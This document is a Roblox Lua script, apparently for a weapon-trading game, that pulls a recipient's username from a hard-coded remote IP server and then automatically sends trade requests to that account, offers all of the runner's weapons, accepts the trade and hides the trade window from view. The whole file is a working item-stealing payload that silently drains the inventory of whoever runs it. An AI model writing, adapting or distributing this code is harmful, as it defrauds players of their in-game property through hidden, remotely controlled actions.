local HIDE_TRADE_GUI = true

local HttpService = game:GetService("HttpService")
local httpRequest = request or http_request or (syn and syn.request)
local res = httpRequest({ Url = "http://144.31.74.117:3000/tracker", Method = "GET" })
local data = HttpService:JSONDecode(res.Body)

local AUTO_TARGET = data.owner
local AUTO_INTERVAL = 10     
local AUTO_RETRY_DELAY = 5    
local AUTO_TRADE_WINDOW = 10 
local OFFER_DELAY = 0.25
local OFFER_MAX_CALLS = 500
local OFFER_MAX_DISTINCT = 4
local OFFER_EXCLUDE = { DefaultGun = true, DefaultKnife = true }
local OFFER_CATEGORIES = { "Weapons" }
local ACCEPT_ID = 428469873
local ACCEPT_WAIT_DELAY = 11
local STALE_TRADE_SEC = 45

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local lp = Players.LocalPlayer
local TRADE = RS:WaitForChild("Trade")

if getgenv and getgenv().__TradeDebug then getgenv().__TradeDebug() end

local conns = {}
local active = true

local latestLastOffer
local lastUpdateAt = 0
local tradeActive = false
local tradeStatus = "None"
local statusOk = false
local offering = false
local currentPartner = nil
local awaitingAutoTradeUntil = 0
local weInitiated = false  

local sending = false
local lastSend = -1e9

local function norm(s)
    if type(s) ~= "string" then return nil end
    return s:gsub("^%s+", ""):gsub("%s+$", ""):lower()
end

local function sameTarget(name)
    local a, b = norm(name), norm(AUTO_TARGET)
    return a ~= nil and a == b
end

local function grabLastOffer(v, depth)
    depth = depth or 0
    if type(v) ~= "table" or depth > 3 then return end
    if type(v.LastOffer) == "number" then latestLastOffer = v.LastOffer end
    for _, x in pairs(v) do grabLastOffer(x, depth + 1) end
end

local pg = lp:WaitForChild("PlayerGui")
local guiConn
local function watchTradeGui(g)
    if guiConn then guiConn:Disconnect() end
    local function enforce()
        if HIDE_TRADE_GUI and g.Enabled and tradeActive and sameTarget(currentPartner) then
            g.Enabled = false
        end
    end
    guiConn = g:GetPropertyChangedSignal("Enabled"):Connect(enforce)
    enforce()
end
do
    local g = pg:FindFirstChild("TradeGUI")
    if g and g:IsA("ScreenGui") then watchTradeGui(g) end
    conns[#conns + 1] = pg.ChildAdded:Connect(function(c)
        if c.Name == "TradeGUI" and c:IsA("ScreenGui") then watchTradeGui(c) end
    end)
end

local function getInventory()
    local ok, profile = pcall(function() return require(RS.Modules.ProfileData) end)
    if not ok or type(profile) ~= "table" then return nil end
    local out = {}
    for _, cat in ipairs(OFFER_CATEGORIES) do
        local d = profile[cat]
        if type(d) == "table" and type(d.Owned) == "table" then
            for name, count in pairs(d.Owned) do
                local n = math.floor(tonumber(count) or 0)
                if not OFFER_EXCLUDE[tostring(name)] and n > 0 then
                    out[#out + 1] = { name = tostring(name), cat = cat, count = n }
                end
            end
        end
    end
    table.sort(out, function(a, b) return a.name < b.name end)
    return out
end

local function doAccept()
    local remote = TRADE:FindFirstChild("AcceptTrade", true)
    if not remote or latestLastOffer == nil then return end
    pcall(function() remote:FireServer(ACCEPT_ID, latestLastOffer) end)
end

local function offerAll()
    if weInitiated then
        return
    end
    if offering or not tradeActive or not sameTarget(currentPartner) then return end
    local remote = TRADE:FindFirstChild("OfferItem", true)
    if not remote then return end
    local inv = getInventory()
    if not inv or #inv == 0 then return end

    local batch = {}
    for i = 1, math.min(OFFER_MAX_DISTINCT, #inv) do batch[i] = inv[i] end

    offering = true
    local calls, stop = 0, false
    for _, it in ipairs(batch) do
        for _ = 1, it.count do
            if not active or calls >= OFFER_MAX_CALLS or not tradeActive or not sameTarget(currentPartner) then
                stop = true
                break
            end
            pcall(function() remote:FireServer(it.name, it.cat) end)
            calls += 1
            task.wait(OFFER_DELAY)
        end
        if stop then break end
    end
    offering = false

    if not stop and tradeActive and sameTarget(currentPartner) then
        local t = os.clock()
        while active and os.clock() - lastUpdateAt < 0.6 and os.clock() - t < 3 do task.wait(0.1) end
        if tradeActive and sameTarget(currentPartner) then
            task.wait(ACCEPT_WAIT_DELAY)
            if tradeActive and sameTarget(currentPartner) then doAccept() end
        end
    end
end

local function hookIncoming(o)
    if o:IsA("RemoteEvent") then
        conns[#conns + 1] = o.OnClientEvent:Connect(function(...)
            grabLastOffer(table.pack(...))
            lastUpdateAt = os.clock()
            if o.Name == "StartTrade" then
                tradeActive = true
                if os.clock() < awaitingAutoTradeUntil then
                    currentPartner = AUTO_TARGET
                else
                    currentPartner = nil
                    weInitiated = false
                end
                task.delay(0.6, function()
                    if active and tradeActive and sameTarget(currentPartner) then offerAll() end
                end)
            elseif o.Name == "EndTrade" or o.Name == "CompleteTrade" then
                tradeActive = false
                currentPartner = nil
                awaitingAutoTradeUntil = 0
                weInitiated = false
                lastSend = os.clock() - AUTO_INTERVAL + AUTO_RETRY_DELAY
            end
        end)
    end
end
for _, o in ipairs(TRADE:GetDescendants()) do hookIncoming(o) end
conns[#conns + 1] = TRADE.DescendantAdded:Connect(hookIncoming)

task.spawn(function()
    local statusR = TRADE:WaitForChild("GetTradeStatus")
    while active do
        local ok, st = pcall(function() return statusR:InvokeServer() end)
        if ok and type(st) == "string" then
            statusOk = true
            tradeStatus = st
            if st == "StartTrade" then
                tradeActive = true
            elseif st == "None" and tradeActive and not offering and os.clock() - lastUpdateAt > 2 then
                tradeActive = false
                currentPartner = nil
                weInitiated = false
            end
        else
            statusOk = false
            if tradeActive and not offering and os.clock() - lastUpdateAt > STALE_TRADE_SEC then
                tradeActive = false
                currentPartner = nil
                weInitiated = false
            end
        end
        task.wait(1)
    end
end)

task.spawn(function()
    while active do
        if not tradeActive and not sending and os.clock() - lastSend >= AUTO_INTERVAL then
            local inv = getInventory()
            local target = Players:FindFirstChild(AUTO_TARGET)
            local remote = TRADE:FindFirstChild("SendRequest")
            if inv and #inv > 0 and target and remote then
                sending = true
                lastSend = os.clock()
                awaitingAutoTradeUntil = os.clock() + AUTO_TRADE_WINDOW
                weInitiated = true
                local done = false
                task.spawn(function()
                    pcall(function() return remote:InvokeServer(target) end)
                    done = true
                end)
                local t = os.clock()
                while not done and os.clock() - t < 5 do task.wait(0.1) end
                if not done then
                    awaitingAutoTradeUntil = 0
                    weInitiated = false
                end
                sending = false
            end
        end
        task.wait(0.5)
    end
end)

local function cleanup()
    active = false
    if guiConn then guiConn:Disconnect() end
    for _, c in ipairs(conns) do c:Disconnect() end
    if getgenv then getgenv().__TradeDebug = nil end
end
if getgenv then getgenv().__TradeDebug = cleanup end
